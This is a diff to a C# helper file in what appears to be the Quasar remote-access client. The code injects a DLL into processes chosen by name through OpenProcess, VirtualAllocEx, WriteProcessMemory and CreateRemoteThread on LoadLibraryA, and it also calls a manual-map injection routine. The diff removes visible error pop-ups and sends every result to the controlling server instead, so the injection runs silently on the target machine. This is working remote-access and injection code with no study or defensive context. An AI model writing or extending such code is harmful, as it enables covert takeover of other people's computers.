@@ -3,14 +3,12 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
-using System.Runtime.InteropServices.ComTypes;
 using System.Text;
 using System.Windows.Forms;
 using Quasar.Client.Utilities;
 using Quasar.Common.Messages;
 
 using Quasar.Common.Networking;
-using static System.Net.Mime.MediaTypeNames;
 
 namespace Quasar.Client.Helper
 {
@@ -23,23 +21,23 @@ namespace Quasar.Client.Helper
                 IntPtr hProcess = NativeMethods.OpenProcess(1082, false, process.Id);
                 if (hProcess == IntPtr.Zero)
                 {
-                    MessageBox.Show("failed to open process");
-                    //client.Send(new NotifyMessageToServer { Message = $"Failed to open process {processName} (ID: {process.Id}). Error: {Marshal.GetLastWin32Error()}" });
+                    //MessageBox.Show("failed to open process");
+                    client.Send(new NotifyMessageToServer { Message = $"Failed to open process {processName} (ID: {process.Id}). Error: {Marshal.GetLastWin32Error()}" });
                     continue;
                 }
                 IntPtr procAddress = NativeMethods.GetProcAddress(NativeMethods.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                 if (procAddress == IntPtr.Zero)
                 {
-                    MessageBox.Show("failed to get loadlibrarya address");
-                    //client.Send(new NotifyMessageToServer { Message = "Failed to get LoadLibraryA address. Error: " + Marshal.GetLastWin32Error() });
+                    //MessageBox.Show("failed to get loadlibrarya address");
+                    client.Send(new NotifyMessageToServer { Message = "Failed to get LoadLibraryA address. Error: " + Marshal.GetLastWin32Error() });
                     NativeMethods.CloseHandle(hProcess);
                     continue;
                 }
                 IntPtr intPtr = NativeMethods.VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
                 if (intPtr == IntPtr.Zero)
                 {
-                    MessageBox.Show("Failed to allocate memory in target process.");
-                    //client.Send(new NotifyMessageToServer { Message = "Failed to allocate memory in target process. Error: " + Marshal.GetLastWin32Error() });
+                    //MessageBox.Show("Failed to allocate memory in target process.");
+                    client.Send(new NotifyMessageToServer { Message = "Failed to allocate memory in target process. Error: " + Marshal.GetLastWin32Error() });
                     NativeMethods.CloseHandle(hProcess);
                     continue;
                 }
@@ -47,8 +45,8 @@ namespace Quasar.Client.Helper
                 UIntPtr uintPtr;
                 if (!NativeMethods.WriteProcessMemory(hProcess, intPtr, array, (uint)array.Length, out uintPtr))
                 {
-                    MessageBox.Show("Failed to write to process memory.");
-                    //client.Send(new NotifyMessageToServer { Message = "Failed to write to process memory. Error: " + Marshal.GetLastWin32Error() });
+                    //MessageBox.Show("Failed to write to process memory.");
+                    client.Send(new NotifyMessageToServer { Message = "Failed to write to process memory. Error: " + Marshal.GetLastWin32Error() });
                     NativeMethods.VirtualFreeEx(hProcess, intPtr, 0, 0x8000); // MEM_RELEASE
                     NativeMethods.CloseHandle(hProcess);
                     continue;
@@ -57,14 +55,14 @@ namespace Quasar.Client.Helper
                 IntPtr remoteThread = NativeMethods.CreateRemoteThread(hProcess, IntPtr.Zero, 0U, procAddress, intPtr, 0U, IntPtr.Zero);
                 if (remoteThread == IntPtr.Zero)
                 {
-                    MessageBox.Show("Failed to create remote thread.");
-                    //client.Send(new NotifyMessageToServer { Message = "Failed to create remote thread. Error: " + Marshal.GetLastWin32Error() });
+                    //MessageBox.Show("Failed to create remote thread.");
+                    client.Send(new NotifyMessageToServer { Message = "Failed to create remote thread. Error: " + Marshal.GetLastWin32Error() });
                     NativeMethods.VirtualFreeEx(hProcess, intPtr, 0, 0x8000); // MEM_RELEASE
                 }
 
                 NativeMethods.CloseHandle(hProcess);
-                // client.Send(new NotifyMessageToServer { Message = "injection is ended" });
-                MessageBox.Show("injection end");
+                client.Send(new NotifyMessageToServer { Message = "injection is ended" });
+                //MessageBox.Show("injection end");
             }
         }
 
@@ -156,8 +154,9 @@ namespace Quasar.Client.Helper
             }
         }
 
-        public static bool ManualNormalUnblockDllInject(string processName, string dllName, ISender client)
+        public static bool InjectNormalUnblockDll(string processName, string dllName, ISender client, out string resultStr)
         {
+            resultStr = "";
             Process[] processes = Process.GetProcessesByName(processName);
             bool isSucess = true;
 
@@ -213,7 +212,7 @@ namespace Quasar.Client.Helper
             {
                 try
                 {
-                    InjectManualMapByProcessId(process.Id, dllPath, isWow64);
+                    resultStr = InjectManualMapByProcessId(process.Id, dllPath, isWow64);
                 }
                 catch (Exception ex6)
                 {
